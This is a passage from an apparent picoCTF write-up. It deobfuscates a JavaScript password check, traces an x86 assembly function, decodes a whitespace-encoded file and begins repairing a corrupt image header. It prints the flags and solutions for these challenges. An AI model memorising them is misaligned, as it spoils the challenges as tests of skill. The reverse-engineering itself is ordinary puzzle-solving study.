</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#8be9fd;font-style:italic">var</span> <span style="color:#bd93f9">_0</span>x5a46 <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#39;f49bf}&#39;</span>, <span style="color:#f1fa8c">&#39;_again_e&#39;</span>, <span style="color:#f1fa8c">&#39;this&#39;</span>, <span style="color:#f1fa8c">&#39;Password\x20Verified&#39;</span>, <span style="color:#f1fa8c">&#39;Incorrect\x20password&#39;</span>, <span style="color:#f1fa8c">&#39;getElementById&#39;</span>, <span style="color:#f1fa8c">&#39;value&#39;</span>, <span style="color:#f1fa8c">&#39;substring&#39;</span>, <span style="color:#f1fa8c">&#39;picoCTF{&#39;</span>, <span style="color:#f1fa8c">&#39;not_this&#39;</span>];

(<span style="color:#8be9fd;font-style:italic">function</span>(<span style="color:#bd93f9">_0</span>x4bd822, <span style="color:#bd93f9">_0</span>x2bd6f7) {
    <span style="color:#8be9fd;font-style:italic">var</span> <span style="color:#bd93f9">_0</span>xb4bdb3 <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">function</span>(<span style="color:#bd93f9">_0</span>x1d68f6) {
        <span style="color:#ff79c6">while</span> (<span style="color:#ff79c6">--</span><span style="color:#bd93f9">_0</span>x1d68f6) {
            <span style="color:#bd93f9">_0</span>x4bd822[<span style="color:#f1fa8c">&#39;push&#39;</span>](<span style="color:#bd93f9">_0</span>x4bd822[<span style="color:#f1fa8c">&#39;shift&#39;</span>]());
        }
    };
    <span style="color:#bd93f9">_0</span>xb4bdb3(<span style="color:#ff79c6">++</span><span style="color:#bd93f9">_0</span>x2bd6f7);
}(<span style="color:#bd93f9">_0</span>x5a46, <span style="color:#bd93f9">0x1b3</span>));

<span style="color:#8be9fd;font-style:italic">var</span> <span style="color:#bd93f9">_0</span>x4b5b <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">function</span>(<span style="color:#bd93f9">_0</span>x2d8f05, <span style="color:#bd93f9">_0</span>x4b81bb) {
    <span style="color:#bd93f9">_0</span>x2d8f05 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">_0</span>x2d8f05 <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x0</span>;
    <span style="color:#8be9fd;font-style:italic">var</span> <span style="color:#bd93f9">_0</span>x4d74cb <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">_0</span>x5a46[<span style="color:#bd93f9">_0</span>x2d8f05];
    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">_0</span>x4d74cb;
};

<span style="color:#8be9fd;font-style:italic">function</span> verify() {
    checkpass <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>[<span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x0&#39;</span>)](<span style="color:#f1fa8c">&#39;pass&#39;</span>)[<span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x1&#39;</span>)];
    split <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x4</span>;
    <span style="color:#ff79c6">if</span> (checkpass[<span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x2&#39;</span>)](<span style="color:#bd93f9">0x0</span>, split <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x2</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x3&#39;</span>)) {
        <span style="color:#ff79c6">if</span> (checkpass[<span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x2&#39;</span>)](<span style="color:#bd93f9">0x7</span>, <span style="color:#bd93f9">0x9</span>) <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;{n&#39;</span>) {
            <span style="color:#ff79c6">if</span> (checkpass[<span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x2&#39;</span>)](split <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x2</span>, split <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x2</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x2</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x4&#39;</span>)) {
                <span style="color:#ff79c6">if</span> (checkpass[<span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x2&#39;</span>)](<span style="color:#bd93f9">0x3</span>, <span style="color:#bd93f9">0x6</span>) <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;oCT&#39;</span>) {
                    <span style="color:#ff79c6">if</span> (checkpass[<span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x2&#39;</span>)](split <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x3</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x2</span>, split <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x4</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x2</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x5&#39;</span>)) {
                        <span style="color:#ff79c6">if</span> (checkpass[<span style="color:#f1fa8c">&#39;substring&#39;</span>](<span style="color:#bd93f9">0x6</span>, <span style="color:#bd93f9">0xb</span>) <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;F{not&#39;</span>) {
                            <span style="color:#ff79c6">if</span> (checkpass[<span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x2&#39;</span>)](split <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x2</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x2</span>, split <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x3</span> <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">0x2</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x6&#39;</span>)) {
                                <span style="color:#ff79c6">if</span> (checkpass[<span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x2&#39;</span>)](<span style="color:#bd93f9">0xc</span>, <span style="color:#bd93f9">0x10</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x7&#39;</span>)) {
                                    alert(<span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x8&#39;</span>));
                                }
                            }
                        }
                    }
                }
            }
        }
    } <span style="color:#ff79c6">else</span> {
        alert(<span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x9&#39;</span>));
    }
}
</code></pre></td></tr></table>
</div>
</div><p>At this stage, I am only interested the verify <code>function</code> with rows starting with <code>if (checkpass</code>.
But to make code more readable, I use the Firefox console to translate some of the code:</p>
<table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>_0x4b5b(&lsquo;0x2&rsquo;)</td>
<td>substring</td>
</tr>
<tr>
<td>checkpass[_0x4b5b(&lsquo;0x2&rsquo;)]</td>
<td>function substring</td>
</tr>
<tr>
<td>_0x4b5b(&lsquo;0x3&rsquo;)</td>
<td>&ldquo;picoCTF{&rdquo;</td>
</tr>
<tr>
<td>_0x4b5b(&lsquo;0x4&rsquo;)</td>
<td>&ldquo;not_this&rdquo;</td>
</tr>
<tr>
<td>_0x4b5b(&lsquo;0x5&rsquo;)</td>
<td>&ldquo;f49bf}&rdquo;</td>
</tr>
<tr>
<td>_0x4b5b(&lsquo;0x6&rsquo;)</td>
<td>&ldquo;_again_e&rdquo;</td>
</tr>
<tr>
<td>_0x4b5b(&lsquo;0x7&rsquo;)</td>
<td>&ldquo;this&rdquo;</td>
</tr>
<tr>
<td>_0x4b5b(&lsquo;0x8&rsquo;)</td>
<td>&ldquo;Password Verified&rdquo;</td>
</tr>
<tr>
<td>split * 0x2</td>
<td>8</td>
</tr>
<tr>
<td>split * 0x2 * 0x2</td>
<td>16</td>
</tr>
<tr>
<td>split * 0x3 * 0x2</td>
<td>24</td>
</tr>
<tr>
<td>split * 0x4 * 0x2</td>
<td>32</td>
</tr>
</tbody>
</table>
<p>We can now rewrite the code in a way it is more readable:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#8be9fd;font-style:italic">function</span> verify() {
    checkpass <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>[<span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x0&#39;</span>)](<span style="color:#f1fa8c">&#39;pass&#39;</span>)[<span style="color:#bd93f9">_0</span>x4b5b(<span style="color:#f1fa8c">&#39;0x1&#39;</span>)];
    split <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x4</span>;
    <span style="color:#ff79c6">if</span> (substring(<span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;picoCTF{&#34;</span> {
        <span style="color:#ff79c6">if</span> (substring(<span style="color:#bd93f9">7</span>, <span style="color:#bd93f9">9</span>) <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;{n&#39;</span>) {
            <span style="color:#ff79c6">if</span> (substring(<span style="color:#bd93f9">8</span>, <span style="color:#bd93f9">16</span>) <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;not_this&#34;</span> {
                <span style="color:#ff79c6">if</span> (substring(<span style="color:#bd93f9">3</span>, <span style="color:#bd93f9">6</span>) <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;oCT&#39;</span>) {
                    <span style="color:#ff79c6">if</span> (substring(<span style="color:#bd93f9">24</span>, <span style="color:#bd93f9">32</span>) <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;f49bf}&#34;</span> {
                        <span style="color:#ff79c6">if</span> (substring(<span style="color:#bd93f9">6</span>, <span style="color:#bd93f9">11</span>) <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;F{not&#39;</span>) {
                            <span style="color:#ff79c6">if</span> (substring(<span style="color:#bd93f9">16</span>, <span style="color:#bd93f9">24</span>) <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;_again_e&#34;</span> {
                                <span style="color:#ff79c6">if</span> (substring(<span style="color:#bd93f9">12</span>, <span style="color:#bd93f9">16</span>) <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;this&#34;</span> {
                                    alert(<span style="color:#f1fa8c">&#34;Password Verified&#34;</span>);
                                }
                            }
                        }
                    }
                }
            }
        }
</code></pre></td></tr></table>
</div>
</div><p>Flag is:  <code>picoCTF{not_this_again_ef49bf}</code></p>
<h2 id="asm2">asm2</h2>
<pre><code>What does asm2(0xb,0x2e) return?
</code></pre>
<p>This is how the stack looks like after the prolog:</p>
<p>| 0x2e      | &lt;&ndash; ebp+0xc (ebp+12)
| 0xb       | &lt;&ndash; ebp+8
| ret       | &lt;&ndash; ebp+4
| old ebp   | &lt;&ndash; new ebp</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#8be9fd;font-style:italic">asm2:</span>
	&lt;+0&gt;:	<span style="color:#50fa7b">push</span>   ebp                      <span style="color:#6272a4">; prolog ;
</span><span style="color:#6272a4"></span>	&lt;+<span style="color:#bd93f9">1</span>&gt;:	mov    ebp,esp                  <span style="color:#6272a4">; prolog ; ebp+8 = 0xb and ebp+0xc = 0x2e
</span><span style="color:#6272a4"></span>	&lt;+<span style="color:#bd93f9">3</span>&gt;:	sub    esp,<span style="color:#bd93f9">0x10</span>
	&lt;+6&gt;:	<span style="color:#50fa7b">mov</span>    eax,DWORD PTR [ebp+<span style="color:#bd93f9">0xc</span>]  <span style="color:#6272a4">; eax = 0x2e
</span><span style="color:#6272a4"></span>	&lt;+<span style="color:#bd93f9">9</span>&gt;:	mov    DWORD PTR [ebp-0x4],eax  <span style="color:#6272a4">; tmp = 0x2e (let&#39;s label ebp-4 as tmp local variable)
</span><span style="color:#6272a4"></span>	&lt;+<span style="color:#bd93f9">12</span>&gt;:	mov    eax,DWORD PTR [ebp+<span style="color:#bd93f9">0x8</span>]  <span style="color:#6272a4">; eax = 0xb
</span><span style="color:#6272a4"></span>	&lt;+<span style="color:#bd93f9">15</span>&gt;:	mov    DWORD PTR [ebp-0x8],eax  <span style="color:#6272a4">; tmp2 = 0xb (let&#39;s label ebp-8 as tmp2 local variable)
</span><span style="color:#6272a4"></span>	&lt;+<span style="color:#bd93f9">18</span>&gt;:	jmp    <span style="color:#bd93f9">0x509</span> &lt;asm2+<span style="color:#bd93f9">28</span>&gt;
	&lt;+20&gt;:	<span style="color:#50fa7b">add</span>    DWORD PTR [ebp-0x4],<span style="color:#bd93f9">0x1</span>          <span style="color:#6272a4">; tmp += 1
</span><span style="color:#6272a4"></span>	&lt;+<span style="color:#bd93f9">24</span>&gt;:	sub    DWORD PTR [ebp-0x8],<span style="color:#bd93f9">0xffffff80</span>   <span style="color:#6272a4">; tmp2 -= -128 (because 0xffffff80 = -128)
</span><span style="color:#6272a4"></span>	&lt;+<span style="color:#bd93f9">28</span>&gt;:	cmp    DWORD PTR [ebp-0x8],<span style="color:#bd93f9">0x63f3</span>       <span style="color:#6272a4">; tmp2 &lt; 0x63f3
</span><span style="color:#6272a4"></span>	&lt;+<span style="color:#bd93f9">35</span>&gt;:	jle    <span style="color:#bd93f9">0x501</span> &lt;asm2+<span style="color:#bd93f9">20</span>&gt;                  <span style="color:#6272a4">; while(tmp2 &lt;= 0x63f3)
</span><span style="color:#6272a4"></span>	&lt;+<span style="color:#bd93f9">37</span>&gt;:	mov    eax,DWORD PTR [ebp-0x4]          <span style="color:#6272a4">; eax = tmp
</span><span style="color:#6272a4"></span>	&lt;+<span style="color:#bd93f9">40</span>&gt;:	leave
	&lt;+41&gt;:	<span style="color:#50fa7b">ret</span>                                     <span style="color:#6272a4">; ret tmp
</span></code></pre></td></tr></table>
</div>
</div><p>Note that <code>0xffffff80</code> is a signed integer with value <code>-128</code>.
This is because the most significant bit represents the sign (0 if positive, 1 if negative) and the remaining 7 bits are the actual value.
it can be represented in this table:</p>
<table>
<thead>
<tr>
<th style="text-align:right">byte4</th>
<th style="text-align:right">byte3</th>
<th style="text-align:right">byte2</th>
<th style="text-align:right">byte1</th>
<th style="text-align:left"></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right">80</td>
<td style="text-align:left">8 bit signed</td>
</tr>
<tr>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right">10000000</td>
<td style="text-align:left">8 bit signed</td>
</tr>
<tr>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right">ff</td>
<td style="text-align:right">80</td>
<td style="text-align:left">16 bit signed</td>
</tr>
<tr>
<td style="text-align:right"></td>
<td style="text-align:right"></td>
<td style="text-align:right">11111111</td>
<td style="text-align:right">10000000</td>
<td style="text-align:left">16 bit signed</td>
</tr>
<tr>
<td style="text-align:right">ff</td>
<td style="text-align:right">ff</td>
<td style="text-align:right">ff</td>
<td style="text-align:right">80</td>
<td style="text-align:left">32 bit signed</td>
</tr>
<tr>
<td style="text-align:right">11111111</td>
<td style="text-align:right">11111111</td>
<td style="text-align:right">11111111</td>
<td style="text-align:right">10000000</td>
<td style="text-align:left">32 bit signed</td>
</tr>
</tbody>
</table>
<p>The above assembly code translates into python:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">asm2</span>(arg1, arg2):
    tmp  <span style="color:#ff79c6">=</span> arg2
    tmp2 <span style="color:#ff79c6">=</span> arg1
    <span style="color:#ff79c6">while</span> tmp2 <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0x63f3</span>:
      tmp <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">1</span>
      tmp2 <span style="color:#ff79c6">+=</span> <span style="color:#bd93f9">128</span>
    <span style="color:#ff79c6">return</span> tmp

<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#8be9fd;font-style:italic">hex</span>(asm2(<span style="color:#bd93f9">0xb</span>, <span style="color:#bd93f9">0x2e</span>))
</code></pre></td></tr></table>
</div>
</div><h2 id="m00nwalk">m00nwalk</h2>
<p>pass</p>
<h2 id="whitepages">WhitePages</h2>
<pre><code>file whitepages.txt
whitepages.txt: UTF-8 Unicode text, with very long lines, with no line terminators
</code></pre>
<p>We can note a pattern <code>e28083</code> and <code>e2808320</code>:</p>
<pre><code>cat whitepages.txt | xxd | head
00000000: e280 83e2 8083 e280 83e2 8083 20e2 8083  ............ ...
00000010: 20e2 8083 e280 83e2 8083 e280 83e2 8083   ...............
00000020: 20e2 8083 e280 8320 e280 83e2 8083 e280   ...... ........
00000030: 83e2 8083 20e2 8083 e280 8320 e280 8320  .... ...... ...
00000040: 2020 e280 83e2 8083 e280 83e2 8083 e280    ..............
00000050: 8320 20e2 8083 20e2 8083 e280 8320 e280  .  ... ...... ..
00000060: 8320 20e2 8083 e280 83e2 8083 2020 e280  .  .........  ..
00000070: 8320 20e2 8083 2020 2020 e280 8320 e280  .  ...    ... ..
00000080: 83e2 8083 e280 83e2 8083 2020 e280 8320  ..........  ...
00000090: e280 8320 e280 8320 e280 83e2 8083 e280  ... ... ........
</code></pre>
<p>Since there is only two values, maybe it&rsquo;s some kind of binary encoding.
I first tried with <code>\u2003</code> as binary 1 and <code>\x20</code> as binary 0, but it did not show anything readable.</p>
<p>Then I have rewritten the below code and switch 0 and 1 to see that the flag was indeed visible:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#6272a4">#!/usr/bin/env python3</span>
<span style="color:#ff79c6">import</span> re

f <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;./whitepages.txt&#34;</span>, mode<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#39;r&#39;</span>, encoding<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;utf-8&#34;</span>)
whitespace <span style="color:#ff79c6">=</span> f<span style="color:#ff79c6">.</span>read()
binary <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#39;0&#39;</span> <span style="color:#ff79c6">if</span> x <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\u2003</span><span style="color:#f1fa8c">&#34;</span> <span style="color:#ff79c6">else</span> <span style="color:#f1fa8c">&#39;1&#39;</span> <span style="color:#ff79c6">for</span> x <span style="color:#ff79c6">in</span> whitespace]
binary_str <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join(binary)

hex_str <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">hex</span>(<span style="color:#8be9fd;font-style:italic">int</span>(binary_str, <span style="color:#bd93f9">2</span>))

<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">pad_hex</span>(some_hex_str):
    <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">len</span>(some_hex_str) <span style="color:#ff79c6">%</span> <span style="color:#bd93f9">2</span>:
        <span style="color:#ff79c6">return</span> <span style="color:#f1fa8c">&#34;0&#34;</span> <span style="color:#ff79c6">+</span> hex_str[<span style="color:#bd93f9">2</span>:]
    <span style="color:#ff79c6">return</span> hex_str[<span style="color:#bd93f9">2</span>:]


byte_array <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">bytes</span><span style="color:#ff79c6">.</span>fromhex(pad_hex(hex_str))

flag <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#34;picoCTF{.*}&#34;</span>, byte_array<span style="color:#ff79c6">.</span>decode())[<span style="color:#bd93f9">0</span>]
<span style="color:#8be9fd;font-style:italic">print</span>(flag)
</code></pre></td></tr></table>
</div>
</div><h2 id="c0rrupt">c0rrupt</h2>
<p>Unable to detect the file type</p>
<pre><code>file mystery
mystery: data
</code></pre>
<p>There is a Hint:</p>
<pre><code>Try fixing the file header
</code></pre>
<p>Examining the header, we can see words <code>gAMA</code>, <code>sRGB</code> and <code>pHYs</code> so perhaps it is an image?</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
